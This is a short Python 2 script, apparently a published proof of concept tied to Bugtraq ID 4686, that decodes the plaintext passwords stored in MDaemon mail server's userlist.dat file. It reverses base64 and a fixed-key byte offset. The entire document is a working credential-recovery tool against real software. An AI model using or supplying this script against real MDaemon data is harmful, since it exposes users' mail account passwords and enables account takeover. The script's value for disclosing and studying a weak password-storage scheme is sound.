#!/usr/bin/python

"""
Author: Manuel Nader @AgoraSecurity
Script to obtain the plaintext password of MDaemons userlist.dat file.
Ref: http://www.securityfocus.com/bid/4686/discuss
Bugtraq ID:	4686
"""

import base64
offset=[84,104,101,32,115,101,116,117,112,32,112,114,111,99,101]
inicial=raw_input("Enter the password in base64: ")
decode=bytearray(base64.b64decode(inicial))
crack=decode
result=bytearray()
for i in range(0,len(crack)):
	if (crack[i]-offset[i]) > 0:
		result.append(crack[i]-offset[i])
	else:
		result.append((crack[i]-offset[i])+128)
print "The password is: ",
print result